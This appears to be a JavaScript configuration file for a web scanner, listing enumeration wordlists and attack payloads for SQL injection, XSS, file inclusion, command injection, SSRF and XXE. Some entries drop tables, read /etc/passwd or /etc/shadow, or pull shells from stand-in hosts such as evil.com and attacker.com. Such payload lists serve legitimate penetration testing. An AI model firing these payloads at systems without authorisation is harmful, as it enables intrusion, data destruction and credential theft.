export const WORDLISTS = {
  common: [
    'admin','login','dashboard','api','upload','config','backup','test','dev','staging',
    'wp-admin','wp-content','wp-login','administrator','phpmyadmin','cpanel',
    'panel','control','manage','manager','management','portal','secure','private',
    'internal','secret','hidden','old','new','temp','tmp','cache','log','logs',
    'static','assets','images','img','css','js','files','downloads','uploads',
    'include','includes','lib','libs','library','libraries','vendor','vendors',
    'src','source','public','private','protected','data','db','database',
    'sql','mysql','mongo','redis','elasticsearch','api/v1','api/v2','api/v3',
    'auth','oauth','token','session','cookie','register','signup','signin',
    'logout','forgot-password','reset-password','verify','confirm','activate',
    'profile','account','settings','preferences','user','users','member','members',
    'about','contact','help','support','docs','documentation','faq','terms',
    'privacy','sitemap','robots.txt','.env','.git','web.config','phpinfo.php',
    'server-status','health','ping','status','metrics','debug','trace',
  ],
  directories: [
    'admin','administrator','backend','panel','dashboard','control','cp','management',
    'wp-admin','wp-content','wp-includes','phpmyadmin','cpanel','plesk','webmin',
    'api','api/v1','api/v2','api/v3','rest','graphql','swagger','docs/api',
    'uploads','upload','files','attachments','media','static','assets','public',
    'backup','backups','bak','old','archive','archives','temp','tmp','cache',
    'logs','log','access','error','debug','trace','monitoring','metrics',
    'config','configs','configuration','settings','env','environment',
    'test','tests','testing','dev','develop','development','staging',
    'src','source','code','scripts','includes','lib','vendor','node_modules',
    '.git','.svn','.hg','.env','.htaccess','web.config','dockerfile',
    'db','database','sql','mysql','data','store','storage',
    'user','users','account','accounts','member','members','profile','profiles',
    'auth','authentication','login','logout','register','session','oauth',
    'internal','intranet','private','secure','hidden','secret','confidential',
  ],
  subdomains: [
    'api','dev','staging','test','admin','mail','smtp','ftp','ssh','vpn',
    'cdn','static','assets','media','images','img','files','download',
    'app','mobile','m','www2','beta','alpha','demo','preview','sandbox',
    'blog','forum','wiki','docs','help','support','portal','dashboard',
    'auth','oauth','sso','login','account','profile','user','member',
    'internal','intranet','secure','private','corp','employee',
    'db','database','mysql','redis','mongo','postgres','elastic',
    'ci','jenkins','gitlab','github','bitbucket','jira','confluence',
    'monitor','metrics','grafana','kibana','prometheus','alertmanager',
    'git','svn','repo','registry','docker','k8s','kubernetes',
  ],
  parameters: [
    'id','user_id','username','email','password','token','key','api_key','auth',
    'file','path','url','redirect','return','next','back','goto','dest',
    'query','q','search','s','keyword','term','filter','sort','order','page',
    'limit','offset','count','size','per_page','max','min',
    'action','method','cmd','command','exec','run','do','op','operation',
    'type','format','mode','lang','language','locale','timezone','currency',
    'callback','jsonp','_jsonp','format','output','response_type',
    'debug','test','trace','verbose','log','dev','staging',
    'name','first_name','last_name','phone','address','zip','country',
    'date','from','to','start','end','begin','expire','created','updated',
  ],
  sqli: [
    "' OR '1'='1", "' OR 1=1 --", "' OR 'x'='x", "'; DROP TABLE users; --",
    "1' UNION SELECT null,null,null--", "' AND SLEEP(5) --", "admin'--",
    "' OR 1=1#", "1 OR 1=1", "' ORDER BY 1--", "' GROUP BY 1--",
    "1' AND '1'='1", "' HAVING 1=1--", "1 UNION SELECT 1,2,3--",
  ],
  xss: [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "javascript:alert(1)", "<svg onload=alert(1)>",
    "\"><script>alert(document.cookie)</script>",
    "<body onload=alert(1)>", "';alert(1)//", "\"><img src=1 onerror=alert(1)>",
    "<iframe src=javascript:alert(1)>", "<<SCRIPT>alert(1)//<</SCRIPT>",
  ],
}

export const VULNERABILITY_PAYLOADS = [
  // SQLi
  "' OR '1'='1", "' OR 1=1 --", "'; DROP TABLE users; --",
  "1 UNION SELECT null,null,null--", "' AND SLEEP(5) --",
  "1' UNION SELECT username,password FROM users--",
  // XSS
  "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
  "<svg onload=alert(document.cookie)>", "javascript:alert(1)",
  // LFI
  "../../../../etc/passwd", "../../../etc/shadow", "..%2F..%2Fetc%2Fpasswd",
  "....//....//etc/passwd", "/etc/passwd%00", "php://filter/convert.base64-encode/resource=index",
  // RFI
  "http://evil.com/shell.php", "https://attacker.com/malware.php",
  "ftp://attacker.com/backdoor.php",
  // Command injection
  "; ls -la", "| cat /etc/passwd", "& whoami", "; id; echo vuln",
  "`id`", "$(id)", "|| ping -c 4 attacker.com",
  // SSRF
  "http://127.0.0.1/admin", "http://169.254.169.254/latest/meta-data/",
  "file:///etc/passwd",
  // XXE
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
  // Path traversal
  "../../../windows/system32/drivers/etc/hosts",
  "..\\..\\..\\windows\\system32\\cmd.exe",
]

export const SCAN_MODES = [
  { value: 'dir',   label: 'Directory Fuzzing',     desc: 'Enumerate hidden directories and files' },
  { value: 'vuln',  label: 'Vulnerability Scan',    desc: 'Test for SQLi, XSS, LFI, RFI and more' },
  { value: 'param', label: 'Parameter Fuzzing',     desc: 'Discover hidden parameters and inputs' },
  { value: 'deep',  label: 'Deep Scan',             desc: 'Comprehensive scan with all payloads' },
]

export const WORDLIST_OPTIONS = [
  { value: 'common',      label: 'Common Paths',       count: '60+  entries' },
  { value: 'directories', label: 'Directories',        count: '60+  entries' },
  { value: 'subdomains',  label: 'Subdomains',         count: '50+  entries' },
  { value: 'parameters',  label: 'Parameters',         count: '50+  entries' },
  { value: 'sqli',        label: 'SQL Injection',      count: '14   payloads' },
  { value: 'xss',         label: 'XSS Payloads',       count: '10   payloads' },
]
